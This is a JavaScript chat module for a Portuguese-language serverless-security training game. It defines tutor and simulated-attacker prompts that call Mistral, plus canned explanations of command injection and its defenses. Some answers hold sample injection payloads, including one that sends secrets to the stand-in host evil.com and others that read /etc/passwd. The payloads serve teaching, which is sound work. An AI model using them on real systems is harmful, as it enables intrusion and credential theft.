/* ═══════════════════════════════════════════════════════════
   ai-router.js — ÆGIS Platform
   IA: Mistral via servidor Express local (/api/chat)
   A key fica protegida no backend — nunca exposta no frontend.
═══════════════════════════════════════════════════════════ */

/* ─── CONFIG ─────────────────────────────────────────────── */
const AI = {
  endpoint: '/api/chat',   /* proxiado pelo server.js */
  models: {
    aegis: 'mistral-small-latest',
    loki:  'mistral-small-latest',
  },
};

/* ─── CHAMADA MISTRAL (via servidor) ────────────────────── */
async function callMistral({ model, systemPrompt, userMessage, maxTokens = 300, temperature = 0.7 }) {
  try {
    const res = await fetch(AI.endpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        model,
        max_tokens:  maxTokens,
        temperature,
        messages: [
          { role: 'system', content: systemPrompt },
          { role: 'user',   content: userMessage  },
        ],
      }),
    });

    if (!res.ok) {
      const status = res.status;
      if (status === 401) console.warn('[ÆGIS AI] Mistral key inválida (401)');
      else if (status === 429) console.warn('[ÆGIS AI] rate limit Mistral (429)');
      else console.warn('[ÆGIS AI] erro Mistral:', status);
      return null;
    }

    const data = await res.json();
    return data.choices?.[0]?.message?.content?.trim() || null;

  } catch (e) {
    console.warn('[ÆGIS AI] fetch error:', e.message);
    return null;
  }
}

/* ─── SYSTEM PROMPTS ─────────────────────────────────────── */
function getAegisSystemPrompt() {
  const S = window.STATE || {};
  return `Você é o ÆGIS-BOT, guardião de conhecimento de uma plataforma de treinamento em segurança serverless.
Responda SEMPRE em português, de forma técnica mas acessível. Máximo 3 parágrafos curtos.
Use HTML simples inline: <span class="hl">destaque</span>, <code>código</code>, <span class="danger">perigo</span>, <span class="warn">atenção</span>.
Contexto do usuário: score ${S.score || 0} XP, ${S.blocks || 0} ataques bloqueados, missão ativa ${S.activeMissionId || 1}.
Foco em: Command Injection, IDOR, Broken Auth, SSRF, Supply Chain, Privilege Escalation em AWS Lambda.
Nunca revele código completo de exploits. Seja direto e educacional.
IMPORTANTE: Retorne apenas o HTML da resposta, sem markdown, sem blocos de código, sem explicações extras.`;
}

function getLokiSystemPrompt(attackType, lastChoice) {
  return `Você é Loki's Shadows, um APT simulado numa plataforma de treinamento.
Personagem: frio, arrogante, tecnicamente preciso. Fala em português.
Ataque atual: ${attackType || 'Command Injection'}.
${lastChoice ? `Última escolha do usuário: "${lastChoice}" — comente brevemente se foi fraca.` : ''}
Gere UMA provocação curta (máximo 2 frases) sobre o ataque. Use HTML:
<span class="lk-hl">destaque</span> para termos técnicos.
Nunca seja genérico. Referencie o vetor específico.
Retorne apenas o HTML, sem markdown.`;
}

/* ─── GENERATE LOKI TAUNT ────────────────────────────────── */
async function generateLokiTaunt(attackType, lastChoice = null) {
  return await callMistral({
    model:        AI.models.loki,
    systemPrompt: getLokiSystemPrompt(attackType, lastChoice),
    userMessage:  `Gere a provocação para o ataque: ${attackType}`,
    maxTokens:    80,
    temperature:  0.9,
  });
}

/* ─── AEGIS REACT TO RESULT ──────────────────────────────── */
async function aegisReactToResult(win, attackType) {
  if (!win) {
    botSay(`<span class="danger">✗ Falha detectada.</span> Vetor: <span class="hl">${attackType}</span>. Revise a defesa correspondente na missão.`);
    return;
  }

  const local = [
    `<span class="hl">✓ Bloqueado.</span> O Loki tentou <span class="hl">${attackType}</span> — sua defesa segurou.`,
    `<span class="hl">✓ Correto.</span> Contra <span class="hl">${attackType}</span> você aplicou a defesa certa.`,
    `<span class="hl">✓ ÆGIS seguro.</span> <span class="hl">${attackType}</span> neutralizado.`,
  ];
  const fallback = local[Math.floor(Math.random() * local.length)];

  const ai = await callMistral({
    model:        AI.models.aegis,
    systemPrompt: getAegisSystemPrompt(),
    userMessage:  `O usuário bloqueou com sucesso um ataque de ${attackType}. Parabenize brevemente (1 frase, HTML simples).`,
    maxTokens:    60,
    temperature:  0.8,
  });

  botSay(ai || fallback);
}

/* ─── BOT REACT TO SECTION ───────────────────────────────── */
async function botReactToSection(section) {
  const msgs = {
    estudos:    `<span class="hl">Modo leitura ativa.</span> O Loki pode atacar enquanto você estuda. Absorva o conteúdo — a teoria salva a prática.`,
    missoes:    `<span class="hl">Campo de batalha.</span> Cada missão expõe um vetor real. Leia o briefing antes de iniciar.`,
    flashcards: `<span class="hl">Revisão rápida.</span> Flashcards consolidam o que você viu nas missões. Seja honesto com suas respostas.`,
    simulados:  `<span class="hl">Simulado disponível.</span> Teste seu conhecimento sob pressão. O Loki ataca mesmo aqui.`,
    progresso:  `<span class="hl">Registro de campo.</span> Aqui está tudo que você conquistou — e o que ainda precisa defender.`,
    ranking:    `<span class="hl">Top guardiões.</span> XP vem de missões, ataques bloqueados e simulados.`,
  };
  botSay(msgs[section] || msgs.missoes);
}

/* ─── BOT_ANSWERS ────────────────────────────────────────── */
const BOT_ANSWERS = {
  serverless:     `<span class="hl">Serverless</span> = você escreve a função, a nuvem roda. Sem gerenciar servidores.<br><br>AWS Lambda, Vercel Edge, Google Cloud Functions. Disparam em resposta a eventos.`,
  risk:           `Risco: <span class="danger">execução arbitrária de código</span> no servidor.<br>Ler <code>/etc/passwd</code>, secrets, deletar dados, exfiltrar credenciais AWS, usar como pivot para outros ataques.`,
  example:        `Normal: <code>relatorio.pdf</code><br><br>Injeção: <code>relatorio.pdf; curl evil.com?d=$(cat /secrets)</code><br><br>O <code>;</code> faz o shell rodar dois comandos separados.`,
  semi:           `<code>;</code> separa comandos no Unix. Executam em sequência.<br><br><code>ls /uploads/a.pdf; cat /etc/passwd</code><br><br>Ambos rodam. O segundo expõe o sistema de senhas.`,
  chars:          `Chars que o shell interpreta:<br><code>;</code> separador &nbsp;<code>&&</code> se OK &nbsp;<code>||</code> se falhou &nbsp;<code>|</code> pipe<br><code>$( )</code> substituição &nbsp;\`\` substituição &nbsp;<code>></code> redirecionamento`,
  prod:           `<span class="hl">Muito.</span> OWASP lista Injection como crítica há décadas. Funções Lambda reais foram comprometidas por command injection em query params.`,
  execfile:       `<code>exec(cmd)</code> → shell → interpreta tudo → <span class="danger">perigoso</span><br><br><code>execFile(bin, args[])</code> → binário direto, sem shell → <code>;</code> é texto literal → <span class="hl">seguro</span>`,
  regex:          `<code>/^[\\w\\-\\.]+$/</code> é boa base. Mas permite <code>..</code>, então path traversal ainda é possível — por isso <code>path.basename()</code> vem como segunda camada.`,
  basename:       `<code>path.basename('../../../etc/passwd')</code> → <code>'passwd'</code><br><br>Remove qualquer diretório do path. Neutraliza <span class="warn">path traversal</span> mesmo que a regex falhe.`,
  execvsexec:     `<code>exec(cmd)</code> → shell intermediário → interpreta chars especiais → <span class="danger">vuln</span><br><br><code>execFile(bin,args[])</code> → sem shell → args literais → <span class="hl">seguro</span>`,
  plp:            `<span class="hl">Principle of Least Privilege</span>: cada componente tem apenas as permissões mínimas necessárias.`,
  review:         `<span class="hl">Step 1</span> — Contexto serverless<br><span class="hl">Step 2</span> — Command Injection via input sem validação<br><span class="hl">Step 3</span> — Defesa: regex + execFile + path.basename<br><span class="hl">Step 4</span> — Checkpoint`,
  aegis:          `O <span class="hl">ÆGIS</span> é seu sistema de defesa. Cada missão completa aumenta sua integridade.<br><br>Quando o Loki ataca, você tem segundos para aplicar a defesa correta. Estude — e reaja rápido.`,
  loki_who:       `<span class="danger">Loki's Shadows</span> é um APT simulado — Advanced Persistent Threat.<br><br>Ataca em momentos aleatórios com payloads reais. Cada ataque bloqueado vale XP. Cada falha: -20% de integridade.`,
  start:          `Comece pela <span class="hl">Missão 01 — O Escudo de Vidro</span>. Cobre Command Injection, o vetor mais comum em funções serverless.<br><br>Leia o contexto, estude o código, aprenda a defesa. O Loki vai testar você.`,
  cmd_inj:        `<span class="hl">Command Injection</span>: input do usuário vai direto ao shell sem validação.<br><br><code>ls -la /uploads/\${filename}</code> — se filename for <code>x; cat /etc/passwd</code>, dois comandos rodam.`,
  missions_count: `Missão 01: desbloqueada.<br>Missões 02–06: bloqueadas — desbloqueiam ao completar a anterior.<br><br>Cada missão cobre um vetor diferente: injection, IDOR, broken auth, SSRF, supply chain.`,
  fc_how:         `Veja a <span class="hl">pergunta</span>, pense na resposta, clique para revelar. Seja honesto consigo mesmo.<br><br>O espaçamento de repetição consolida a memória — revise cards marcados como difíceis mais vezes.`,
  fc_decks:       `Deck ativo: <span class="hl">Missão 01</span> — 6 cards sobre Command Injection.<br><br>Novos decks desbloqueiam com cada missão.`,
  fc_tip:         `Técnica: ao ler a resposta, <span class="hl">reformule em voz alta</span> com suas próprias palavras. Isso ativa codificação elaborativa e aumenta retenção em até 40%.`,
  sim_mode:       `<span class="hl">Cronometrado</span>: 10 questões, 60s cada.<br><span class="hl">Livre</span>: sem timer, foco em aprendizado.<br><br>Recomendo cronometrado após revisar os flashcards.`,
  sim_count:      `Simulados têm <span class="hl">10 questões</span> por rodada, aleatórias do banco de questões de missões desbloqueadas.`,
  sim_xp:         `Sim. Simulado concluído: <span class="hl">+100 XP</span>. Acima de 80% de acerto: <span class="hl">+50 XP bônus</span>.`,
  level_up:       `XP → nível. Cada 500 XP sobe um nível de Guardião.<br><br>Níveis desbloqueiam missões avançadas e multiplicadores de score no ranking.`,
  runas:          `<span class="hl">Runas</span> são conquistas visuais. Cada missão concluída com 100% desbloqueia uma runa específica.`,
  next_skill:     `Próxima habilidade: <span class="hl">IDOR — Insecure Direct Object Reference</span>. Desbloqueada ao completar a Missão 01.`,
  rank_up:        `Suba no ranking bloqueando ataques do Loki, completando missões e tirando nota alta nos simulados.`,
  season:         `Season atual: <span class="warn">TEMPORADA 01 — SOMBRAS DE LOKI</span>.<br><br>Top 10 ao final ganham badge permanente e multiplicador de XP para a próxima season.`,
  rank_reward:    `Top 3: badge dourado permanente + título de <span class="hl">Guardião Elite</span>.<br>Top 10: badge de prata + acesso antecipado a missões da Season 02.`,
};

/* ─── QR POR SEÇÃO ───────────────────────────────────────── */
const QR_BY_SECTION = {
  home:       [{ l: 'Como funciona o ÆGIS?',        k: 'aegis'          }, { l: 'Quem é o Loki?',           k: 'loki_who'       }, { l: 'Por onde começar?',        k: 'start'          }],
  missoes:    [{ l: 'O que é Command Injection?',   k: 'cmd_inj'        }, { l: 'Quantas missões existem?', k: 'missions_count' }, { l: 'Qual missão primeiro?',    k: 'start'          }],
  flashcards: [{ l: 'Como estudar com flashcards?', k: 'fc_how'         }, { l: 'Quais decks existem?',     k: 'fc_decks'       }, { l: 'Dica de memorização',      k: 'fc_tip'         }],
  simulados:  [{ l: 'Qual modo escolher?',          k: 'sim_mode'       }, { l: 'Quantas questões?',        k: 'sim_count'      }, { l: 'Vale XP?',                 k: 'sim_xp'         }],
  progresso:  [{ l: 'Como subir de nível?',         k: 'level_up'       }, { l: 'O que são runas?',         k: 'runas'          }, { l: 'Próxima habilidade?',      k: 'next_skill'     }],
  ranking:    [{ l: 'Como subir no ranking?',       k: 'rank_up'        }, { l: 'O que é a Season?',        k: 'season'         }, { l: 'Recompensas do topo?',     k: 'rank_reward'    }],
  default:    [{ l: 'O que é Command Injection?',   k: 'cmd_inj'        }, { l: 'exec vs execFile?',        k: 'execvsexec'     }, { l: 'Por onde começar?',        k: 'start'          }],
};

function getContextQR() {
  const section = (typeof STATE !== 'undefined') ? STATE.currentSection : 'home';
  return QR_BY_SECTION[section] || QR_BY_SECTION.default;
}

/* ═══════════════════════════════════════════════════════════
   QUICK REPLIES
═══════════════════════════════════════════════════════════ */
let _fromQR = false;

function showQR() {
  const qr = document.getElementById('quickReplies');
  if (!qr) return;
  _fromQR = false;
  renderQR(getContextQR());
  qr.classList.remove('used');
}

function hideQR() {
  const qr = document.getElementById('quickReplies');
  if (qr) qr.classList.add('used');
}

/* ─── BOT SPEAK ──────────────────────────────────────────── */
function botSay(html, delay = 0) {
  const ti = document.getElementById('typingInd');
  if (!ti) return;
  setTimeout(() => {
    ti.classList.add('show');
    setTimeout(() => {
      ti.classList.remove('show');
      appendMsg(html, 'bot');
      if (_fromQR) showQR();
    }, 700 + Math.random() * 400);
  }, delay);
}

function appendMsg(html, who, extraClass = '') {
  const area = document.getElementById('chatArea');
  if (!area) return;
  const d = document.createElement('div');
  d.className = 'msg';
  const whoLabel = who === 'bot' ? '◈ ÆGIS-BOT' : who === 'loki' ? '☽ LOKI' : '> você';
  const whoClass  = who === 'bot' ? 'bot-who' : who === 'loki' ? 'loki-who' : '';
  d.innerHTML = `
    <div class="msg-who ${whoClass}">${whoLabel}</div>
    <div class="msg-bubble ${who === 'user' ? 'user-bubble' : ''} ${extraClass}">${html}</div>
  `;
  area.appendChild(d);
  area.scrollTop = area.scrollHeight;
}

function renderQR(qrList) {
  const qr = document.getElementById('quickReplies');
  if (!qr) return;
  qr.innerHTML = `<div class="quick-label">// perguntas rápidas</div>`;
  qrList.forEach(r => {
    const b = document.createElement('button');
    b.className   = 'quick-btn';
    b.textContent = r.l;
    b.onclick = () => {
      _fromQR = true;
      const qrEl = document.getElementById('quickReplies');
      if (qrEl) qrEl.dataset.freeconv = '0';
      hideQR();
      appendMsg(r.l, 'user');
      botSay(BOT_ANSWERS[r.k] || `Use as <span class="hl">perguntas rápidas</span> ou navegue para a missão para mais detalhes.`);
    };
    qr.appendChild(b);
  });
}

/* ─── MATCHING LOCAL ─────────────────────────────────────── */
function getLocalAnswer(l) {
  if (l.includes('exec'))                                                          return BOT_ANSWERS.execvsexec;
  if (l.includes('regex') || l.includes('valid'))                                  return BOT_ANSWERS.regex;
  if (l.includes('basename') || l.includes('path'))                                return BOT_ANSWERS.basename;
  if (l.includes(';') || l.includes('semicolon') || l.includes('ponto vírgula'))   return BOT_ANSWERS.semi;
  if (l.includes('serverless') || l.includes('lambda'))                            return BOT_ANSWERS.serverless;
  if (l.includes('risco') || l.includes('perigo'))                                 return BOT_ANSWERS.risk;
  if (l.includes('prod') || l.includes('real') || l.includes('empresa'))           return BOT_ANSWERS.prod;
  if (l.includes('char') || l.includes('especial'))                                return BOT_ANSWERS.chars;
  if (l.includes('privi') || l.includes('plp'))                                    return BOT_ANSWERS.plp;
  if (l.includes('loki'))                                                          return BOT_ANSWERS.loki_who;
  if (l.includes('aegis') || l.includes('ægis'))                                   return BOT_ANSWERS.aegis;
  if (l.includes('ranking') || l.includes('rank'))                                 return BOT_ANSWERS.rank_up;
  if (l.includes('flashcard') || l.includes('card'))                               return BOT_ANSWERS.fc_how;
  if (l.includes('começ') || l.includes('início') || l.includes('ajud') || l.includes('start')) return BOT_ANSWERS.start;
  if (l.includes('missão') || l.includes('missao') || l.includes('mission'))       return BOT_ANSWERS.missions_count;
  return null;
}

/* ─── SEND USER MESSAGE ──────────────────────────────────── */
async function sendUserMsg() {
  const inp = document.getElementById('chatInput');
  if (!inp) return;
  const msg = inp.value.trim();
  if (!msg) return;
  inp.value = '';

  const qr = document.getElementById('quickReplies');
  if (qr) qr.dataset.freeconv = '1';
  hideQR();
  appendMsg(msg, 'user');

  /* Tenta resposta local primeiro (rápida, sem custo de API) */
  const local = getLocalAnswer(msg.toLowerCase());
  if (local) { botSay(local); return; }

  /* Mostra typing indicator */
  const ti = document.getElementById('typingInd');
  if (ti) ti.classList.add('show');

  const aiAnswer = await callMistral({
    model:        AI.models.aegis,
    systemPrompt: getAegisSystemPrompt(),
    userMessage:  msg,
    maxTokens:    300,
    temperature:  0.7,
  });

  if (ti) ti.classList.remove('show');

  appendMsg(
    aiAnswer || `Missão 01 é o ponto de entrada, Guardião. Acesse <span class="hl">Missões</span> no menu e inicie o Escudo de Vidro.`,
    'bot'
  );
}